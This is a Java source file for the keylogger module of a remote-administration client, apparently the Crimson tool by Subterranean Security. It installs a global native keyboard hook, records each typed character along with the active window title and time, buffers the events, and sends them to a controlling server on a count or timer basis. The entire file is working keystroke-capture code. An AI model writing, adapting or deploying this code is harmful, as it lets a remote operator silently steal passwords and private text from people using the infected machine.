/******************************************************************************
 *                                                                            *
 *                    Copyright 2016 Subterranean Security                    *
 *                                                                            *
 *  Licensed under the Apache License, Version 2.0 (the "License");           *
 *  you may not use this file except in compliance with the License.          *
 *  You may obtain a copy of the License at                                   *
 *                                                                            *
 *      http://www.apache.org/licenses/LICENSE-2.0                            *
 *                                                                            *
 *  Unless required by applicable law or agreed to in writing, software       *
 *  distributed under the License is distributed on an "AS IS" BASIS,         *
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.  *
 *  See the License for the specific language governing permissions and       *
 *  limitations under the License.                                            *
 *                                                                            *
 *****************************************************************************/
package com.subterranean_security.crimson.client.modules;

import java.awt.GraphicsEnvironment;
import java.awt.HeadlessException;
import java.util.ArrayList;

import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import com.subterranean_security.crimson.client.net.ClientCommands;
import com.subterranean_security.crimson.core.proto.Keylogger.FLUSH_METHOD;
import com.subterranean_security.crimson.core.proto.Keylogger.EV_KEvent;
import com.subterranean_security.crimson.core.util.Native;

public enum Keylogger {
	;
	private static final Logger log = LoggerFactory.getLogger(Keylogger.class);

	/**
	 * Keybuffer that stores results from native hook
	 */
	public static ArrayList<EV_KEvent> buffer = new ArrayList<EV_KEvent>();

	/**
	 * Thread that monitors the keybuffer for changes
	 */
	private static Thread monitor;

	/**
	 * Native keyboard interface
	 */
	private static NKL nkl;

	/**
	 * Launches the keylogger with given options
	 * 
	 * @param m
	 * @param value
	 * @throws HeadlessException
	 * @throws NativeHookException
	 */
	public static void start(FLUSH_METHOD m, int value) throws HeadlessException, NativeHookException {
		if (GraphicsEnvironment.isHeadless()) {
			throw new HeadlessException();
		}

		stop();
		log.info("Starting keylogger");

		monitor = new Thread(new Runnable() {
			public void run() {
				try {
					switch (m) {
					case EVENT:
						while (!Thread.currentThread().isInterrupted()) {
							// wait for an event
							synchronized (buffer) {
								buffer.wait();
							}

							if (buffer.size() > value) {
								ClientCommands.flushKeybuffer();
							}

						}
						break;
					case TIME:
						while (!Thread.currentThread().isInterrupted()) {
							Thread.sleep(value);
							ClientCommands.flushKeybuffer();

						}
						break;
					default:
						break;

					}

				} catch (InterruptedException e) {
					return;
				}

			}
		});
		monitor.start();

		nkl = new NKL(m);
		try {
			GlobalScreen.registerNativeHook();
			GlobalScreen.addNativeKeyListener(nkl);
		} catch (NativeHookException e) {
			stop();
			throw e;
		}

	}

	/**
	 * Stops keylogger if running
	 */
	public static void stop() {
		if (monitor != null) {
			log.info("Stopping keylogger");

			monitor.interrupt();
			monitor = null;
		}

		try {
			if (nkl != null) {
				GlobalScreen.removeNativeKeyListener(nkl);
			}
			GlobalScreen.unregisterNativeHook();
		} catch (NativeHookException e) {
		}

	}

	/**
	 * Query the state of the keylogger
	 * 
	 * @return true if keylogger is running
	 */
	public static boolean isLogging() {
		return monitor == null ? false : (monitor.isAlive() && GlobalScreen.isNativeHookRegistered());
	}

}

class NKL implements NativeKeyListener {

	private FLUSH_METHOD method;

	public NKL(FLUSH_METHOD m) {
		this.method = m;
	}

	@Override
	public void nativeKeyTyped(NativeKeyEvent e) {

		// grab that window title
		String windowTitle = null;
		try {
			windowTitle = Native.getActiveWindow();
		} catch (Throwable e1) {
			windowTitle = "unknown window";
		}

		synchronized (Keylogger.buffer) {
			Keylogger.buffer.add(EV_KEvent.newBuilder().setDate(e.getWhen()).setTitle(windowTitle)
					.setEvent((e.getModifiers() == 0 ? "" : "") + e.getKeyChar()).build());

			if (method == FLUSH_METHOD.EVENT) {
				// notify monitor thread
				Keylogger.buffer.notifyAll();

			}
		}

	}

	@Override
	public void nativeKeyPressed(NativeKeyEvent arg0) {
		// TODO Auto-generated method stub

	}

	@Override
	public void nativeKeyReleased(NativeKeyEvent arg0) {
		// TODO Auto-generated method stub

	}
}
